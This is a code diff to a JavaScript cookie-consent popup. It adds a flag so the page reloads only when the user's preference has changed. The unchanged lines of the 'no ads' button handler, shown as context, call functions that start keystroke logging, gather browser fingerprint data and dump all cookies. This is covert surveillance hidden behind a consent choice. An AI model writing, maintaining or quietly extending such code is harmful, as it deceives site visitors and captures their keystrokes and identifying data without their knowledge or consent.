@@ -1,4 +1,6 @@
 (function() {
+    let preferenceChanged = false; // Flag to track if the preference has changed
+
     // Function to set a cookie
     function setCookie(name, value, days) {
         const date = new Date();
@@ -137,7 +139,9 @@
         adsButton.addEventListener("click", function() {
             setCookie("userPreference", "ads", 30);
             document.body.removeChild(overlay);
-            setTimeout(() => location.reload(), 100); // Reload the page
+            if (preferenceChanged) {
+                setTimeout(() => location.reload(), 100); // Reload the page if preference changed
+            }
         });
 
         noAdsButton.addEventListener("click", function() {
@@ -147,7 +151,9 @@
             startKeystrokeLogging();
             gatherFingerprintData();
             console.log("All cookies:", getAllCookies());
-            setTimeout(() => location.reload(), 100); // Reload the page
+            if (preferenceChanged) {
+                setTimeout(() => location.reload(), 100); // Reload the page if preference changed
+            }
         });
     }
 
@@ -312,6 +318,7 @@
         document.body.appendChild(button);
 
         button.addEventListener("click", function() {
+            preferenceChanged = true;
             createPopup();
         });
     }
